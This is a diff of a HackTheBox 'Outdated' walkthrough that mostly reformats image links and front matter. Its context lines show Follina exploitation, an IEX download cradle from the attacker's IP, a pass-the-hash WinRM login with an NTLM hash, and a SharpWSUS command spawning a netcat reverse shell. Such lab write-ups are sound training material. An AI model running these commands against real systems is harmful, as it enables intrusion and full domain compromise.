@@ -1,7 +1,17 @@
+---
+description: >-
+  Outdated HTB Machine
+title: Outdated (Medium)                # Add title here
+date: 2023-01-30 08:00:00 -0600                           # Change the date to match completion date
+categories: [HackTheBox, Windows - Medium]                     # Change Templates to Writeup
+tags: [hackthebox, smb enumeration, follina exploitation, invoke-powershelltcp, conptyshell, sharphound, bloodhound, addkeycredentiallink privilege, invoke-whisker, rubeus, ntlm, winrm, evilwinrm, wsus admin group, wsus exploitation]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
+show_image_post: true                                    # Change this to true
+image: /assets/img/icons/Outdated.png                # Add infocard image here for post preview image
+---
 ### Host: 10.10.11.175 
 If Active Directory => Synchronize your NTP with the domain controller:
 ```bash
-nptdate 10.10.10.103
+nptdate 10.10.11.175
 ```
 ### Content
 
@@ -179,7 +189,7 @@ smb: \> get NOC_Reminder.pdf
 getting file \NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (222.7 KiloBytes/sec) (average 222.7 KiloBytes/sec)
 ```
 The content of such PDF is the following:
-![[Pasted image 20230124143536.png]]
+![Description](/assets/img/Pasted image 20230124143536.png)
 We get the following users while enumerating with kerbrute:
 ```bash
 kerbrute userenum --dc 10.10.11.175 -d outdated.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
@@ -242,7 +252,7 @@ Connection: Keep-Alive
 
 ### Exploitation
 Searching for the vulnerabilities on the PDF (CVE-2022-30190) we find some references to the popular Follina exploit:
-![[Pasted image 20230124191307.png]]
+![Description](/assets/img/Pasted image 20230124191307.png)
 After research a little bit about it, we identify a potential [Follina](https://github.com/chvancooten/follina.py)
 github PoC. In order to exploit it all we need is to be shown in the help menu of the script: ^d8b8a4
 ```bash
@@ -258,7 +268,7 @@ Generated 'exploit.html' in 'www' directory
 Serving payload on http://localhost:80/exploit.html
 ```
 This command will create a file called exploit.html on port 80 of the localhost interface, such file has the following content:
-![[Pasted image 20230124224208.png]]
+![Description](/assets/img/Pasted image 20230124224208.png)
 In order to execute our reverse shell with Powershell we'll extract this html file into an index.html to serve it with a web server:
 ```bash
 curl -s http://localhost/exploit.html > index.html
@@ -334,7 +344,7 @@ What we need to perform on the victim machine is to first download the [Sharphou
 PS C:\Windows\Temp\Recon> curl 10.10.14.2/SharpHound.exe -o SharpHound.exe
 ```
 The output of the executable will generate two files:
-![[Pasted image 20230125003006.png]]
+![Description](/assets/img/Pasted image 20230125003006.png)
 Starting an SMB server on our machine we'll be able to download such file:
 ```bash
 impacket-smbserver shareFolder $(pwd) -smb2support
@@ -344,25 +354,25 @@ Then all we need to do is download the file by copying it to the shareFolder Sha
 copy bh.zip \\10.10.14.2\shareFolder\bh.zip
 ```
 Then we need to upload this file into the Bloodhound service:
-![[Pasted image 20230125004339.png]]
+![Description](/assets/img/Pasted image 20230125004339.png)
 After loading we then can use the bloodhound tool to check for potential pivoting and privilege escalations on the machines. One of the first enumeration techniques that we need to perform is to enumerate what we can do with our current compromised user, for that we need to enter its name on the search bar:
-![[Pasted image 20230125004842.png]]
+![Description](/assets/img/Pasted image 20230125004842.png)
 Then we click on "Mark User as Owned":
-![[Pasted image 20230125004932.png]]
+![Description](/assets/img/Pasted image 20230125004932.png)
 Then we click on btables user's icon and select any of the options on the search navigation bar and then select the Domain Admin Group:
-![[Pasted image 20230125005138.png]]
+![Description](/assets/img/Pasted image 20230125005138.png)
 If the user is not generated on the graphic that means, there is no direct path to the Domain Admin:
-![[Pasted image 20230125005421.png]]
+![Description](/assets/img/Pasted image 20230125005421.png)
 So we need to keep looking, now with the option "Shortest Path from Owned Principals"
-![[Pasted image 20230125005540.png]]
+![Description](/assets/img/Pasted image 20230125005540.png)
 And now we get something interesting:
-![[Pasted image 20230125005648.png]]
+![Description](/assets/img/Pasted image 20230125005648.png)
 If we right -click on the "AddKeyCredentialLink" and select the Help menu:
-![[Pasted image 20230125010007.png]]
+![Description](/assets/img/Pasted image 20230125010007.png)
 We can see that in order to escalate privileges we need to abuse of Whiskers executable:
-![[Pasted image 20230125013418.png]]
+![Description](/assets/img/Pasted image 20230125013418.png)
 And also it gives the Info to Abuse of such misconfiguration:
-![[Pasted image 20230125013507.png]]
+![Description](/assets/img/Pasted image 20230125013507.png)
 We can download its counterpart on .ps1, in this case we can download the [Invoke-Whiskers.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Whisker.ps1) and upload it to the machine: ^f177f9
 ```bash
 PS C:\Windows\Temp\Recon> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/Invoke-Whisker.ps1')
@@ -450,12 +460,12 @@ evil-winrm -i 10.10.11.175 -u 'sflowers' -H '1FCDB1F6015DCB318CC77BB2BDA14DB5'
 
 ### Privilege Escalation
 If we execute a "whoami /groups" command we receive the following output:
-![[Pasted image 20230125020305.png]]
+![Description](/assets/img/Pasted image 20230125020305.png)
 
-While searching for this WSUS we find that there is an exploit that allows to execute any command as administrator [SharpWSUS](https://labs.nettitude.com/blog/introducing-sharpwsus/)
+While searching for this WSUS we find that there is an exploit that allows to execute any command as administrator [SharpWSUS](https://labs.nettitude.com/blog/introducing-sharpwsus/)[^dotnet-compilation]
 But as no binary is public we need to compile it from scratch, for that we need a Windows Machine with Visual Studio, please follow the [[dot NET Project Visual Studio compilation]] guide to create the .exe binary.
 Where we can compile the WSUS.exe and upload it to the machine.
-Once uploaded we then proceed to upload as well PsExec64.exe and nc.exe and from the machine we can execute this payload: ^474447
+Once uploaded we then proceed to upload as well PsExec64.exe and nc.exe and from the machine we can execute this payload: 
 ```powershell
 *Evil-WinRM* PS C:\Windows\Temp\PrivEsc> .\SharpWSUS.exe create /payload:"C:\Windows\Temp\PrivEsc\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c C:\\Windows\\Temp\\PrivEsc\\nc.exe -ecmd 10.10.14.2 1234" /title:"Reverse"
 ```
@@ -517,7 +527,4 @@ HASH-NTLM: sflowers:1FCDB1F6015DCB318CC77BB2BDA14DB5
 [Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
 [SharpWSUS](https://labs.nettitude.com/blog/introducing-sharpwsus/)
 
-# Flag
-
-proof.txt
-
+[^dotnet-compilation]: dotNET Project Compilation with Visual Studio
